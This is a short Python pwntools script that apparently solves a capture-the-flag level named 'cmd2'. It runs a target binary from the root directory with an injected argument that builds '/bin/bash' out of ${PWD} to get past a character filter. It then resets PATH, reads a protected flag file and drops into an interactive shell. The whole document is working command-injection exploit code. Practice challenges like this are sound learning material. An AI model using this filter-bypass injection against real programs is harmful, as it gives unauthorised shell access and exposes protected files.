import pwn
import tempfile
import os
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

os.chdir('/')
p = pwn.process([f'{args.filename}', 'eval "\\${PWD}bin\\${PWD}bash"'])
p.sendline("export PATH=/usr/bin/")
p.sendline("cat /home/cmd2/flag")
p.interactive()
